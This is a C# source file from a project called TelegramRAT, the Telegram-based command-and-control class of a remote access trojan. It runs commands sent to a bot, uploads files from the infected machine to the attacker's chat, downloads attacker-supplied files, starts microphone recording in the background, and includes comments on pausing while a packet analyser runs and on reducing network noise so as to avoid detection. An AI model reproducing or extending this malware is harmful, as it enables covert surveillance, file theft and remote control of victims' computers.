using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using SimpleJSON;
using System.IO;

namespace TelegramRAT
{
    public class TelegramAPI
    {
        HttpClient client;
        private int myID { get; set;  }
        public bool waitingForFile { get; set; }
        public string downloadFilePath { get; set; }
        private int lastUpdateID;

        public bool isBlocked { get; set; }
        public bool waitsForSelfdestruction { get; set; }

        private bool recording;
        public void ChangeRecordingStatus() {
            recording = !recording;
            MicRecorder.Interrupt();
        }
        public bool GetRecordingStatus() { return recording; }

        public int GetID() { return myID; }

        Thread MicRecorder;

        public TelegramAPI()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
            client = new HttpClient();

            myID   = new Random().Next(1, 32000);
            lastUpdateID = 0;
            waitingForFile   = false;
            downloadFilePath = String.Empty;
            isBlocked = false;

            waitsForSelfdestruction = false;
            recording = false;

            MicRecorder = new Thread(() => Actions.RecordMicrophone(this));
            MicRecorder.Start();
        }

        public async void SendMessage(string text)
        {
            waitForUnblock();
            try
            {
                string response = await client.GetStringAsync("https://api.telegram.org/bot" 
                    + Config.TelegramBot_Token 
                    + "/sendMessage?chat_id=" + Config.TelegramChat_ID 
                    + "&text=(" + myID.ToString() + ") " + text);
            }
            catch (Exception ex)
            {
                Log.WriteError("TelegramAPI.SendMessage", ex);
            }
        }

        public async void SendFile(string file)
        {
            waitForUnblock();
            try
            {
                MultipartFormDataContent formdata = new MultipartFormDataContent();
                var file_bytes = File.ReadAllBytes(file);
                formdata.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "document", file);
                var response = await client.PostAsync("https://api.telegram.org/bot"
                    + Config.TelegramBot_Token 
                    + "/send"
                    + "Document?chat_id=" + Config.TelegramChat_ID, formdata);
            }
            catch (Exception ex)
            {
                SendMessage("Error al subir el archivo: " + ex.Message);
            }
        }

        public void WaitForCommands()
        {
            while (true)
            {
                // The thread running processChecker can block this method if it detected a packet analyser
                waitForUnblock();
                // Since we're constantly polling using GET, we add a little delay so as to not create too much noise
                Thread.Sleep(Config.commandCheckerDelay);
                lastUpdateID++;
                string response = String.Empty;
                try
                {
                    // Even though HTTPClient is asynchronous, we need the thread to be blocked waiting for a response
                    response = client.GetStringAsync($"https://api.telegram.org/bot{Config.TelegramBot_Token}/getUpdates?offset={lastUpdateID}").Result;
                } 
                catch (Exception ex)
                {
                    Log.WriteError("TelegramAPI.WaitForCommands", ex);
                    continue;
                }
                var json = JSON.Parse(response);

                // Analyse each message separetely
                foreach (JSONNode node in json["result"].AsArray)
                {
                    JSONNode message = node["message"];
                    string chatID = message["chat"]["id"];
                    // Update the ID of the last update
                    lastUpdateID = node["update_id"].AsInt;

                    // Only messages from the configured chat ID are valid
                    if (chatID != Config.TelegramChat_ID)
                    {
                        string username = message["chat"]["username"];
                        string first_name = message["chat"]["first_name"];
                        if (username != String.Empty)
                        {
                            SendMessage("Invalid message from @" + username);
                        }
                        else if (first_name != String.Empty)
                        {
                            SendMessage("Invalid message from " + first_name);
                        }
                        else
                        {
                            SendMessage("Invalid message from an anonymous account");
                        }
                        
                        continue;
                    }
                    if (message.HasKey("text"))
                    {
                        string command = message["text"];
                        if (!command.StartsWith("/"))
                            continue;
                        // Every thread running a command shares this object to communicate back and forth using the same HTTPClient instance (it prevents new TLS handshakes and, thus, reduces packet noise)
                        CommandHandler.Execute(this, command);

                    // Check if the message was a document, photo or video
                    } else if (FileType(message) != String.Empty)
                    {
                        // Check if a file was expected for download, through the /upload command
                        if (waitingForFile)
                        {
                            string fileType = FileType(message);
                            string fileID = message[fileType]["file_id"];
                            // Photos are arrays
                            if (fileType == "photo")
                                fileID = message[fileType][0]["file_id"];
                            // Get file location inside Telegram's server
                            string telegramFilePath = JSON.Parse(client.GetStringAsync("https://api.telegram.org/bot" +
                                Config.TelegramBot_Token +
                                "/getFile" +
                                "?file_id=" + fileID).Result)["result"]["file_path"];

                            Thread t = new Thread(() => Actions.DownloadFile(this, telegramFilePath));
                            t.Start();
                        }
                    }
                }
            }
        }

        public void ChangeID()
        {
            int oldID = myID;
            myID = new Random().Next(1, 32000);
            while (oldID == myID)
            {
                myID = new Random().Next(1, 32000);
            }
        }

        private string FileType(JSONNode message)
        {
            if (message.HasKey("document"))
            {
                return "document";
            }
            else if (message.HasKey("photo"))
            {
                return "photo";
            }
            else if (message.HasKey("video"))
            {
                return "video";
            }
            else if (message.HasKey("audio"))
            {
                return "audio";
            }

            return String.Empty;
        }

        private void waitForUnblock()
        {
            while (true)
            {
                // Basic types are atomic by default in .NET
                if (!isBlocked)
                {
                    break;
                }
            }
        }
    }
}
